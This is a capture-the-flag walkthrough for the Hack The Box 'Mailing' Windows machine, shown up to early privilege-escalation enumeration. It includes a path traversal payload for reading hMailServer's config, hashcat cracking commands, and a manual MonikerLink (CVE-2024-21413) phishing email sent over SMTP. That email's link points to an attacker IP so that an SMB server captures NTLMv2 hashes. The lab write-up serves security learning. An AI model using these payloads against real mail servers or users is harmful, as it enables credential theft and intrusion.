# HTB – Mailing
### TL;DR
This is a Windows 10 Pro machine running a mail server (POP3, SMTP and IMAP). We can get mail administrator credentials exploiting a path traversal vulnerability in the web site. To retrieve the user flag we exploit a "MonikerLink" (CVE-2024-21413) vulnerability in Outlook which allows us to gain a NTLMv2 hash that, once cracked, enables a low-privileged session in the host. Regarding escalation, we exploit a vulnerable version of LibreOffice (CVE-2023-2255) to add ourselves into the local administrators group.
### KEYWORDS
hMailServer, SMTP, IMAP, OpenSSL, STARTTLS, MonikerLink, CVE-2024-21413, NTLMv2, LibreOffice, CVE-2023-2255, pass-the-hash.
### REFERENCES
https://www.hmailserver.com/forum/viewtopic.php?t=29069<br>
https://www.cvedetails.com/cve/cve-2024-21413<br>
https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture<br>
https://www.samlogic.net/articles/smtp-commands-reference.htm<br>
https://mailtrap.io/blog/telnet-send-email<br>
https://www.cvedetails.com/cve/CVE-2023-2255/<br>
https://github.com/elweth-sec/CVE-2023-2255<br>
<br>
### ENUMERATION
Port scan.
```markdown
> nmap $target -p- --min-rate=5000 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-05 14:23 EDT
Nmap scan report for 10.10.11.14
Host is up, received user-set (0.11s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
25/tcp    open  smtp         syn-ack
80/tcp    open  http         syn-ack
110/tcp   open  pop3         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
143/tcp   open  imap         syn-ack
445/tcp   open  microsoft-ds syn-ack
465/tcp   open  smtps        syn-ack
587/tcp   open  submission   syn-ack
993/tcp   open  imaps        syn-ack
5040/tcp  open  unknown      syn-ack
5985/tcp  open  wsman        syn-ack
7680/tcp  open  pando-pub    syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
54380/tcp open  unknown      syn-ack

Nmap done: 1 IP address (1 host up) scanned in 66.09 seconds
```
Enumerate the open ports.
```markdown
> nmap $target -p25,80,110,135,139,143,445,465,587,993,5040,5985 -sV -sC -Pn -vv -n
Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-05 14:25 EDT
Nmap scan report for 10.10.11.14
Host is up, received user-set (0.12s latency).
Scanned at 2024-05-05 14:25:16 EDT for 206s

PORT     STATE SERVICE       REASON  VERSION
25/tcp   open  smtp          syn-ack hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp  open  pop3          syn-ack hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
143/tcp  open  imap          syn-ack hMailServer imapd
|_imap-capabilities: IMAP4rev1 QUOTA SORT RIGHTS=texkA0001 NAMESPACE IMAP4 completed CAPABILITY CHILDREN IDLE ACL OK
445/tcp  open  microsoft-ds? syn-ack
465/tcp  open  ssl/smtp      syn-ack hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/emailAddress=ruy@mailing.htb/localityName=Madrid
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/emailAddress=ruy@mailing.htb/localityName=Madrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32df3f1d1608b899d2e39b6467297e
| SHA-1: 5c3e5265c5bc68abaaac0d8fab8d90b47895a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp  open  smtp          syn-ack hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/emailAddress=ruy@mailing.htb/localityName=Madrid
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/emailAddress=ruy@mailing.htb/localityName=Madrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32df3f1d1608b899d2e39b6467297e
| SHA-1: 5c3e5265c5bc68abaaac0d8fab8d90b47895a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp  open  ssl/imap      syn-ack hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/emailAddress=ruy@mailing.htb/localityName=Madrid
| Issuer: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU/organizationalUnitName=MAILING/emailAddress=ruy@mailing.htb/localityName=Madrid
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-27T18:24:10
| Not valid after:  2029-10-06T18:24:10
| MD5:   bd32df3f1d1608b899d2e39b6467297e
| SHA-1: 5c3e5265c5bc68abaaac0d8fab8d90b47895a3d7
| -----BEGIN CERTIFICATE-----
| MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
| MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
| ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
| BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
| HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
| ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
| aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
| YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
| wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
| i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
| ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
| pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
| OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
| DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
| yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
| Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
| ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
| 8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
| spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 QUOTA SORT RIGHTS=texkA0001 NAMESPACE IMAP4 completed CAPABILITY CHILDREN IDLE ACL OK
5040/tcp open  unknown       syn-ack
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 29452/tcp): CLEAN (Timeout)
|   Check 2 (port 39838/tcp): CLEAN (Timeout)
|   Check 3 (port 37492/udp): CLEAN (Timeout)
|   Check 4 (port 25477/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-05T18:28:01
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 206.51 seconds
```
We have discovered the first username of the domain `ruy@mailing.htb`. Add to hosts file and inspect the site with Firefox.

![Untitled](https://github.com/user-attachments/assets/342d2323-2107-4c73-907f-6ce699de7004)

Looks like there is a mail server "Powered by hMailServer". Also, we have a list of team members. Since have already disclosed an username we can figure out the pattern used to create the accounts. We will assume the other accounts are `maya@mailing.htb` and `gregory@mailing.htb`<br>
<br>
Click on "Download instructions", a request to `http://mailing.htb/download.php?file=instructions.pdf` is sent. This looks like a candidate for path traversal.<br>
<br>
Let's try a path traversal in Windows with this payload `../../../windows/win.ini`

![Untitled11](https://github.com/user-attachments/assets/76ff4bc3-de68-4eb6-8e65-87f280feaab5)

The path traversal vulnerability is confirmed.

### USER
Once the vulnerability has been confirmed, let's imagine ways to exploit it. Normally, path traversal can be exploited to make the application render a local file (which is called LFI), or to read sensitive files in the file system. In this case, we know the host is running hMailServer, so we'll use path traversal to read the configuration file.<br>
<br>
In support forums (https://www.hmailserver.com/forum/viewtopic.php?t=29069) they say configuration file is located at `c:\program files (x86)\hmailserver\bin\hmailserver.ini`. <br>
<br>
Browse this file using the path traversal with this payload `../../../program+files+(x86)/hmailserver/bin/hmailserver.ini`

![Untitled2](https://github.com/user-attachments/assets/4858157d-e11d-4218-bae8-94f71e957283)

Crack the MD5 administrator hash (module 0).
```markdown
> hashcat -m 0 -a 0 -d 1 hash.txt .\rockyou.txt
```
You surely have heard about this "MonikerLink" critical vulnerability discovered this year affecting Outlook (https://www.cvedetails.com/cve/cve-2024-21413/). Basically, Outlook does not manage correctly links to SMB shared files in the body of HTML messages when a "!" character is inserted in the middle of the link. Details on the vulnerability here: https://research.checkpoint.com/2024/the-risks-of-the-monikerlink-bug-in-microsoft-outlook-and-the-big-picture/.<br>
<br>
Normally, Outlook should block these SMB requests for security reasons since NTLMv2 hashes can be captured, but the insertion of the exclamation mark "!" changes Outlook's behavior.<br>
<br>
Let's exploit this by sending a malicious email to `maya@mailing.htb`. One option is to do it using one of the multiple POCs linked to this vulnerability in Github (just follow the instructions provided by the exploit creator).<br>
<br>
However, since we already have administrator credentials in the mail server, in this write up we will exploit it manually, interacting directly with the server via Telnet/Netcat commands. Here more info on how to interact with an SMTP server from command line: https://www.samlogic.net/articles/smtp-commands-reference.htm<br>
<br>
In this case we can use both SMTP or IMAP (secure SMTP) since both ports 25 and 587 are open. In the first option, SMTP (25), information is sent unencrypted, whereas in the second option, IMAP (587), the information is sent encrypted, therefore we need to establish a TLS connection first. The sequence of commands for the SMTP case is the following.<br>

Connect to the server using Netcat.
```markdown
> nc -nvC $target 25
(UNKNOWN) [10.10.11.14] 25 (smtp) open
```
Identify yourself in the server.
```markdown
ehlo host
250-mailing.htb
250-SIZE 20480000
250-AUTH LOGIN PLAIN
250 HELP
```
Log in using administrator credentials, this has to be done in base64 encoding.
```markdown
auth login
334 VXNlcm5hbWU6
YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
334 UGFzc3dvcmQ6
aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
235 authenticated.
```
Select the sender and the receipt.
```markdown
mail from:administrator@mailing.htb
250 OK
rcpt to:maya@mailing.htb
250 OK
```
Now you can send the body of the email, it will have a plain text part and an HTML part, containing the malicious link. I found here how to create HTML emails using SMTP command line: https://mailtrap.io/blog/telnet-send-email/<br>

The body of the email could something like this.
```markdown
data
354 OK, send.
From: administrator@mailing.htb
To: maya@mailing.htb
Subject: URGENT - security patch
MIME-Version: 1.0;
Content-Type: multipart/alternative; boundary="boundary_string"

--boundary_string
Content-Type: text/plain; charset="utf-8"

Hey Maya, read this in HTML mode and click on the attached link asap. 

--boundary_string
Content-Type: text/html; charset="utf-8"

<html>
<body>
<h1><a href="file:///\\10.10.xxx.xxx\dummy!smtp">urgent click here to install security patch</a></h1>
</body>
</html>

--boundary_string--

.
250 Queued (12.703 seconds)
quit
221 goodbye
```
Remember that to finish the email data and add to queue for sending you need to press "enter" + "." + "enter".

![Untitled3](https://github.com/user-attachments/assets/b26bd82c-1a7a-4030-8cd3-0850b7f87054)

Now start an Impacket SMB server. If everything goes well, in a couple of minutes maya will click on the email link and we will be able to capture her NTLMv2 hash.

![Untitled4](https://github.com/user-attachments/assets/d2180bbb-a457-48b4-8910-959851b84ffa)

Other option is to use the IMAP protocol, the TLS encrypted version of SMTP. For this, we need to connect to port 587 using the STARTTLS protocols extension and initiate a TLS handshake. We cannot do this with Telnet/Netcat because TLS is binary and involves cryptography, and you cannot do this by hand. Instead, we can use the `openssl s_client` command.<br>

Start a secure TLS connection to port 587 (the flag `-crlf` is used to automatically send a "CRLF" character after each line).

```bash
> openssl s_client -starttls smtp -connect mailing.htb:587 -crlf
CONNECTED(00000003)
depth=0 C = EU, ST = EU\\Spain, L = Madrid, O = Mailing Ltd, OU = MAILING, CN = mailing.htb, emailAddress = ruy@mailing.htb
verify error:num=18:self-signed certificate
verify return:1
depth=0 C = EU, ST = EU\\Spain, L = Madrid, O = Mailing Ltd, OU = MAILING, CN = mailing.htb, emailAddress = ruy@mailing.htb
verify return:1
---
Certificate chain
 0 s:C = EU, ST = EU\\Spain, L = Madrid, O = Mailing Ltd, OU = MAILING, CN = mailing.htb, emailAddress = ruy@mailing.htb
   i:C = EU, ST = EU\\Spain, L = Madrid, O = Mailing Ltd, OU = MAILING, CN = mailing.htb, emailAddress = ruy@mailing.htb
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Feb 27 18:24:10 2024 GMT; NotAfter: Oct  6 18:24:10 2029 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIDpzCCAo8CFAOEgqHfMCTRuxKnlGO4GzOrSlUBMA0GCSqGSIb3DQEBCwUAMIGP
MQswCQYDVQQGEwJFVTERMA8GA1UECAwIRVVcU3BhaW4xDzANBgNVBAcMBk1hZHJp
ZDEUMBIGA1UECgwLTWFpbGluZyBMdGQxEDAOBgNVBAsMB01BSUxJTkcxFDASBgNV
BAMMC21haWxpbmcuaHRiMR4wHAYJKoZIhvcNAQkBFg9ydXlAbWFpbGluZy5odGIw
HhcNMjQwMjI3MTgyNDEwWhcNMjkxMDA2MTgyNDEwWjCBjzELMAkGA1UEBhMCRVUx
ETAPBgNVBAgMCEVVXFNwYWluMQ8wDQYDVQQHDAZNYWRyaWQxFDASBgNVBAoMC01h
aWxpbmcgTHRkMRAwDgYDVQQLDAdNQUlMSU5HMRQwEgYDVQQDDAttYWlsaW5nLmh0
YjEeMBwGCSqGSIb3DQEJARYPcnV5QG1haWxpbmcuaHRiMIIBIjANBgkqhkiG9w0B
AQEFAAOCAQ8AMIIBCgKCAQEAqp4+GH5rHUD+6aWIgePufgFDz+P7Ph8l8lglXk4E
wO5lTt/9FkIQykSUwn1zrvIyX2lk6IPN+airnp9irb7Y3mTcGPerX6xm+a9HKv/f
i3xF2oo3Km6EddnUySRuvj8srEu/2REe/Ip2cIj85PGDOEYsp1MmjM8ser+VQC8i
ESvrqWBR2B5gtkoGhdVIlzgbuAsPyriHYjNQ7T+ONta3oGOHFUqRIcIZ8GQqUJlG
pyERkp8reJe2a1u1Gl/aOKZoU0yvttYEY1TSu4l55al468YAMTvR3cCEvKKx9SK4
OHC8uYfnQAITdP76Kt/FO7CMqWWVuPGcAEiYxK4BcK7U0wIDAQABMA0GCSqGSIb3
DQEBCwUAA4IBAQCCKIh0MkcgsDtZ1SyFZY02nCtsrcmEIF8++w65WF1fW0H4t9VY
yJpB1OEiU+ErYQnR2SWlsZSpAqgchJhBVMY6cqGpOC1D4QHPdn0BUOiiD50jkDIx
Qgsu0BFYnMB/9iA64nsuxdTGpFcDJRfKVHlGgb7p1nn51kdqSlnR+YvHvdjH045g
ZQ3JHR8iU4thF/t6pYlOcVMs5WCUhKKM4jyucvZ/C9ug9hg3YsEWxlDwyLHmT/4R
8wvyaiezGnQJ8Mf52qSmSP0tHxj2pdoDaJfkBsaNiT+AKCcY6KVAocmqnZDWQWut
spvR6dxGnhAPqngRD4sTLBWxyTTR/brJeS/k
-----END CERTIFICATE-----
subject=C = EU, ST = EU\\Spain, L = Madrid, O = Mailing Ltd, OU = MAILING, CN = mailing.htb, emailAddress = ruy@mailing.htb
issuer=C = EU, ST = EU\\Spain, L = Madrid, O = Mailing Ltd, OU = MAILING, CN = mailing.htb, emailAddress = ruy@mailing.htb
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: ECDH, prime256v1, 256 bits
---
SSL handshake has read 1726 bytes and written 487 bytes
Verification error: self-signed certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: A142D062AF7C5A21BF40DA8330028A2A7C546ADCE4CCA5BA7637977ADCE87E16
    Session-ID-ctx: 
    Master-Key: C35898ADBE0488F70E7F575F6082CA294856E49D03B416E875CBCC23E9E4E1BD72FF2EA84078548139717AAE7DC6004B
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 20 a9 9f 88 47 64 98 2d-10 81 89 f4 d9 71 ca 0b    ...Gd.-.....q..
    0010 - 11 d2 95 44 4f c3 bb b1-a8 96 98 ec 53 0f eb f1   ...DO.......S...
    0020 - 7b 68 69 d5 4a 0c 71 fc-33 e7 75 69 91 ce 54 5d   {hi.J.q.3.ui..T]
    0030 - f2 17 9e a6 ba 04 7e 1d-23 95 af 7b fa 31 ae 9c   ......~.#..{.1..
    0040 - 74 9b 39 48 ed b4 05 6a-83 ff 7f 88 29 af 28 26   t.9H...j....).(&
    0050 - 72 09 2e d6 37 d6 e0 59-a6 f6 a5 13 d2 1a 5e 2f   r...7..Y......^/
    0060 - f8 e8 3b 01 63 0c f1 3d-e3 88 3b 47 c2 da 49 e4   ..;.c..=..;G..I.
    0070 - 55 e5 ba 50 2f 86 5d 0e-6a 76 8a 66 37 72 aa 58   U..P/.].jv.f7r.X
    0080 - 38 1e 88 e8 38 f5 94 c2-bb e9 d5 88 1e 61 b5 88   8...8........a..
    0090 - d1 d4 a0 a2 7b 34 67 be-d7 50 7b 4e a4 11 fd d2   ....{4g..P{N....

    Start Time: 1725559122
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: yes
---
250 HELP
```

![Untitled5](https://github.com/user-attachments/assets/89a5ff8f-e83c-49db-ba55-02527a1d04fd)

Once the secure session is established, the sequence of commands is the same as the previous case.
```markdown
auth login
334 VXNlcm5hbWU6
YWRtaW5pc3RyYXRvckBtYWlsaW5nLmh0Yg==
334 UGFzc3dvcmQ6
aG9tZW5ldHdvcmtpbmdhZG1pbmlzdHJhdG9y
235 authenticated.
mail from:administrator@mailing.htb
250 OK
rcpt to:maya@mailing.htb
250 OK
data
354 OK, send.
From: administrator@mailing.htb
To: maya@mailing.htb
Subject: URGENT - security patch
MIME-Version: 1.0;
Content-Type: multipart/alternative; boundary="boundary_string"

--boundary_string
Content-Type: text/plain; charset="utf-8"

Hey Maya, read this in HTML mode and click on the attached link asap. 

--boundary_string
Content-Type: text/html; charset="utf-8"

<html>
<body>
<h1><a href="file:///\\10.10.14.146\dummy!imap">urgent click here to install security patch</a></h1>
</body>
</html>

--boundary_string--

.
250 Queued (36.032 seconds)
quit
221 goodbye
00C58A7C917F0000:error:0A000126:SSL routines::unexpected eof while reading:../ssl/record/rec_layer_s3.c:689:
```
And the NTLMv2 hash is received on the SMB server as well.

![Untitled6](https://github.com/user-attachments/assets/65f9c1d3-652b-4e1d-a46a-94979a47cfd4)

NTLMv2 hashes cannot be passed, but we always can crack them (module 5600).
```markdown
> hashcat -m 5600 -a 0 -d 1 hash.txt .\rockyou.txt
```
Use the credentials to open a WinRM session on the host as user `maya`

![Untitled7](https://github.com/user-attachments/assets/ca448bb6-8a50-4a3f-8773-d740e17cd93e)

Which can be used to retrieve the user flag.

### ROOT
Start from the low-privileged WinRM session an take the opportunity to enumerate the user and the system.
```powershell
> whoami
mailing\maya

> net user maya
User name                    maya
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2024-04-12 4:16:20 AM
Password expires             Never
Password changeable          2024-04-12 4:16:20 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2024-09-06 5:40:15 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Usuarios
                             *Usuarios de escritori
Global Group memberships     *Ninguno
The command completed successfully.

> Get-ComputerInfo
WindowsBuildLabEx                                       : 19041.1.amd64fre.vb_release.191206-1406
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : Professional
WindowsInstallationType                                 : Client
WindowsInstallDateFromRegistry                          : 2/27/2024 3:26:14 PM
WindowsProductId                                        : 00330-80112-18556-AA447
WindowsProductName                                      : Windows 10 Pro
WindowsRegisteredOrganization                           :
WindowsRegisteredOwner                                  : localadmin
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 2009
…
TimeZone                                                : (UTC+01:00) Brussels, Copenhagen, Madrid, Paris
LogonServer                                             : \\MAILING
PowerPlatformRole                                       : Desktop
```
Enumerate the installed software.
```powershell
> cd "c:\program files"

*Evil-WinRM* PS C:\program files> dir

    Directory: C:\program files

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/27/2024   5:30 PM                Common Files
d-----          3/3/2024   4:40 PM                dotnet
d-----          3/3/2024   4:32 PM                Git
d-----         4/29/2024   6:54 PM                Internet Explorer
d-----          3/4/2024   6:57 PM                LibreOffice
d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
d-----         2/27/2024   4:58 PM                MSBuild
d-----         2/27/2024   5:30 PM                OpenSSL-Win64
d-----         3/13/2024   4:49 PM                PackageManagement
d-----         2/27/2024   4:58 PM                Reference Assemblies
d-----         3/13/2024   4:48 PM                RUXIM
d-----         2/27/2024   4:32 PM                VMware
d-----          3/3/2024   5:13 PM                Windows Defender
d-----         4/29/2024   6:54 PM                Windows Defender Advanced Threat Protection
d-----          3/3/2024   5:13 PM                Windows Mail
d-----          3/3/2024   5:13 PM                Windows Media Player
d-----         4/29/2024   6:54 PM                Windows Multimedia Platform
d-----         2/27/2024   4:26 PM                Windows NT
d-----          3/3/2024   5:13 PM                Windows Photo Viewer
d-----         4/29/2024   6:54 PM                Windows Portable Devices
d-----         12/7/2019  10:31 AM                Windows Security
d-----         3/13/2024   4:49 PM                WindowsPowerShell
```
Enumerate the installed LibreOffice version.
```powershell
> type readme_en-us.txt

======================================================================

LibreOffice 7.4 ReadMe

